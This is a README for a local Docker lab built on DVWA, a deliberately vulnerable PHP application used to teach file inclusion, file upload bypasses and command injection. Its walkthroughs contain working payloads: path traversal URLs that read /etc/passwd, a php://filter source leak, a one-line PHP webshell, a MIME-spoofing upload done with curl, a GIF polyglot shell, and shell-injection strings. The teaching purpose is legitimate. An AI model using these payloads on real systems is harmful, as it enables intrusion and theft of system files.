# File Upload, LFI, RFI & Command Injection Lab (DVWA)

## Overview

Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications, and aid teachers/students to teach/learn web application security in a class room environment.

This lab unit focuses specifically on:

- **Local & Remote File Inclusion (LFI / RFI)**: Exploiting unsanitized file inclusion routines using path traversal sequences, absolute paths, and PHP stream wrappers (`php://filter`, `php://input`).
- **Unrestricted / Filter-Bypassing File Uploads**: Bypassing client-side, MIME-type, and extension-blacklist filters to upload and execute PHP webshells.
- **Command Injection**: Arbitrary shell command concatenation via vulnerable system execution functions.

- **Default Port / Access**: `http://localhost:8087`
- **Database Setup URL**: `http://localhost:8087/setup.php`
- **Directory**: `Classes/02_web_penetration_tester/17_18_19_file_and_command_attacks/dvwa_uploads_lfi`

---

## Architecture & Persistence

- **Container Name**: `cyberlab_02_dvwa_lfi_upload`
- **Base Image**: `vulnerables/web-dvwa:latest`
- **Host Port**: `8087:80`
- **Persistent Storage**:
  - `dvwa_uploads_db_data:/var/lib/mysql`: Preserves MySQL databases, user states, and guestbook data across container recreation and reboots.
- **Pull Policy**: `pull_policy: missing`

---

## Upstream Sources & References

- **Official DVWA Repository**: [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
- **Official DVWA Website**: [http://www.dvwa.co.uk/](http://www.dvwa.co.uk/)
- **OWASP File Inclusion**: [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- **OWASP Unrestricted File Upload**: [https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- **PHP Supported Protocols and Wrappers**: [https://www.php.net/manual/en/wrappers.php](https://www.php.net/manual/en/wrappers.php)

---

## Lab Setup & Database Initialization

### 1. Start the Container

From the repository root:

```bash
./lab start uploads-lfi
```

Or directly within this directory:

```bash
docker compose up -d
```

### 2. Initialize the Database via `/setup.php`

1. Navigate to **`http://localhost:8087/setup.php`** (or simply visit `http://localhost:8087/`, which redirects to `setup.php` if uninitialized).
2. Review the pre-flight checks (PHP version, MySQL connectivity, uploads folder write permissions).
3. Scroll to the bottom and click the **"Create / Reset Database"** button.
4. DVWA creates the database tables (`users`, `guestbook`), populates test records, and generates `/config/config.inc.php.bak`.
5. Upon displaying `Setup successful!`, navigate to `http://localhost:8087/login.php`.

### 3. Login & Security Level Configuration

- **Login Credentials**:
  - **Username**: `admin`
  - **Password**: `password`
- **Adjust Security Level**:
  - Navigate to **DVWA Security** (`http://localhost:8087/security.php`).
  - Set the security level to **Low** (to learn baseline mechanics), then advance to **Medium** and **High** to practice filter evasion.

---

## Vulnerability Mechanics & Walkthroughs

### 1. Local File Inclusion (LFI) & Directory Traversal

- **Vulnerable Module**: `http://localhost:8087/vulnerabilities/fi/?page=...`
- **Source Code Mechanism (Low)**:
  ```php
  <?php
  // The page parameter is directly passed into include() without sanitization
  $file = $_GET[ 'page' ];
  include( $file );
  ?>
  ```

#### Exploitation Techniques:

- **Absolute Path Traversal**:
  ```text
  http://localhost:8087/vulnerabilities/fi/?page=/etc/passwd
  ```
- **Relative Directory Traversal**:
  ```text
  http://localhost:8087/vulnerabilities/fi/?page=../../../../etc/passwd
  ```
- **Filter Evasion (Medium Security)**:
  Medium security uses `str_replace( array( "../", "..\\" ), "", $file )`. Bypass this with nested sequences:
  ```text
  http://localhost:8087/vulnerabilities/fi/?page=....//....//....//etc/passwd
  ```
- **Source Code Exfiltration via PHP Wrappers**:
  Read application PHP source code without server-side execution:
  ```text
  http://localhost:8087/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php
  ```
  Decode the resulting base64 string to read `/var/www/html/index.php`.

---

### 2. File Upload Vulnerability & Filter Bypass

- **Vulnerable Module**: `http://localhost:8087/vulnerabilities/upload/`
- **Destination Folder**: `/var/www/html/hackable/uploads/` (accessible at `http://localhost:8087/hackable/uploads/<filename>`)

#### Exploitation Techniques:

- **Low Security (No Restrictions)**:
  Upload a direct PHP shell (`shell.php`):

  ```php
  <?php system($_GET['cmd']); ?>
  ```

  Access and execute commands:

  ```bash
  curl "http://localhost:8087/hackable/uploads/shell.php?cmd=id;uname+-a"
  ```

- **Medium Security (MIME / Content-Type Bypass)**:
  Medium security checks `$_FILES['uploaded']['type'] == "image/jpeg" || $_FILES['uploaded']['type'] == "image/png"`.
  Bypass by intercepting the upload request in Burp Suite / curl and retaining `.php` extension while specifying a valid image MIME type:

  ```bash
  curl -X POST "http://localhost:8087/vulnerabilities/upload/" \
    -b "PHPSESSID=<SESSION_ID>; security=medium" \
    -F "MAX_FILE_SIZE=100000" \
    -F "uploaded=@shell.php;type=image/jpeg" \
    -F "Upload=Upload"
  ```

- **High Security (Chained LFI + Upload)**:
  High security checks file extensions and uses `getimagesize()`.
  Create a polyglot image or append PHP code to an existing image header:
  ```bash
  echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.jpg
  ```
  Upload `shell.jpg`, then execute it via LFI:
  ```text
  http://localhost:8087/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id
  ```

---

### 3. Command Injection

- **Vulnerable Module**: `http://localhost:8087/vulnerabilities/exec/`
- **Source Code Mechanism (Low)**:
  ```php
  $target = $_REQUEST[ 'ip' ];
  if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
      $cmd = shell_exec( 'ping  ' . $target );
  } else {
      $cmd = shell_exec( 'ping  -c 4 ' . $target );
  }
  ```
- **Exploit Payloads**:
  - Concatenation: `127.0.0.1; whoami; id; cat /etc/passwd`
  - Pipe: `127.0.0.1 | id`
  - AND operator: `127.0.0.1 && id`

---

## YouTube Walkthroughs & Solving Guides

- [CryptoCat - DVWA File Inclusion (LFI/RFI) Walkthrough](https://www.youtube.com/watch?v=KY58WcX7OZ4)
- [CryptoCat - DVWA File Upload Walkthrough](https://www.youtube.com/watch?v=K7XBQWAZdZ4)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start this lab
./lab start uploads-lfi

# Check status
./lab status

# Stop this lab
./lab stop uploads-lfi
# or from this directory:
docker compose down
```
